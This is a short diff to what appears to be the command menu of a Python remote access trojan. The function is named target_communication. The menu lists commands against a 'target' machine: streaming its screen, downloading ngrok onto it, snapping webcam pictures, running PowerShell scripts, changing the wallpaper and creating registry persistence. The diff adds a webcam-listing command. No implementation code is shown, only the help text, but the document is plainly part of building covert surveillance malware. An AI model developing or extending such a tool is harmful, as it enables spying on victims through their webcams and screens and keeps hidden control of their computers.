@@ -256,7 +256,8 @@ def target_communication(target, ip):
                     screenshare                        --> stream client screen
                     ssharescreen                       --> stopstreaming
                     ngroksetup                         --> download ngrok on the client
-                    webcam_snap                        --> open target webcam and get Pic
+                    webcam_snap                        --> open target webcam and get Pic ex:webcam_snap 0
+                    webcam_list                        --> get Available Webcam Sources
                     changepolicy                       --> execute powershell scripts
                     cwallpaper                         --> change wallpaper
                     persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
